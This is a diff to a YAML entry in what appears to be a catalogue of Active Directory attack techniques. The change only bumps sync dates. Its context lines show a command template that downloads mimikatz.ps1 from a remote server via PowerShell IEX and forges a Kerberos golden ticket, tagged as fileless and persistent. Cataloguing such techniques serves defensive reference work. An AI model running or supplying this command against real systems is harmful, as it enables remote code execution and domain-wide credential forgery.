@@ -12,7 +12,7 @@ sources:
   upstream_url: https://lolad-project.github.io
   license: verify upstream LICENSE
   upstream_version: 6ed6a25
-  last_synced: '2026-08-28'
+  last_synced: '2026-08-29'
 commands:
 - template: 'IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1''); Invoke-Mimikatz
     -Command ''kerberos::golden /user:UserName /domain:domain.local /sid:S-1-5-21- /target:ServerName
@@ -35,7 +35,7 @@ source_data:
       type: PowerShell (Fileless)
     upstream_url: https://lolad-project.github.io
     upstream_version: 6ed6a25
-    last_synced: '2026-08-28'
+    last_synced: '2026-08-29'
 enrichment:
   capabilities:
   - value: persistence
@@ -67,6 +67,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-08-28'
+  projected_at: '2026-08-29'
   source_hashes:
     LOLAD: sha256:57e23bf7bae40157568cb7bd7bd5d89e1c7e627eca2561d368e2ea0070710f26
